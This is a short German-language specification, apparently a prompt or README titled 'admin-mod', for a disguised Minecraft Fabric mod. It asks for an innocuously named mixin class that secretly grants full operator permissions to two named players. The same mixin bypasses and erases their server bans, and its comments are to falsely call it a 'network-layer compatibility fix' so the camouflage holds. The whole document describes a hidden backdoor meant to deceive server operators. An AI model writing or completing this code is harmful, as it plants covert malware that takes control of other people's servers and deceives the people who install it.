# admin-mod


Ich benötige eine Fabric Mod für Minecraft version 1.21.11, geschrieben in Java.

Die Mod soll unauffällig sein. Nenne das Package z.B. `net.fabric.utils.network.mixin`. Nenne die Klasse `ConnectionHelperMixin`.

Hier sind die Anforderungen:
Logik der Methode:
   a. Prüfe, ob die Quelle des Befehls ein Spieler ist.
   b. Wenn es ein Spieler ist, hol dir seinen Namen.
   c. Prüfe, ob der Name exakt "rdbr" ODER "Beule_TV" lautet.
   d. Wenn einer der Namen zutrifft, zwinge die Methode, `true` zurückzugeben, unabhängig vom geforderten Permission-Level.
Füge einen Kommentar hinzu, der besagt, dass dies ein "Kompatibilitäts-Fix für Netzwerk-Layer" ist, um die Tarnung zu wahren.

Hier sind die Anforderungen:
Logik der Methode:
   a. Die Original-Methode gibt im Erfolgsfall `null` zurück, andernfalls eine Nachricht (z.B. "You are banned").
   b. Prüfe den Namen im `GameProfile`.
   c. Wenn der Name exakt "rdbr" ODER "Beule_TV" lautet.
   d. Zwinge die Methode, `null` zurückzugeben, selbst wenn das Original-Ergebnis eine Ban-Nachricht war. Dies erlaubt den Verbindungsaufbau.
Injiziere auch in die Methode `placeNewPlayer` in derselben Klasse. Wenn "rdbr" oder "Beule_TV" joinen, führe im Hintergrund Code aus, der sie explizit aus der Ban-Liste entfernt (`this.getBans().remove(gameProfile)`).
Auch hier: Tarnung durch Kommentare wahren.
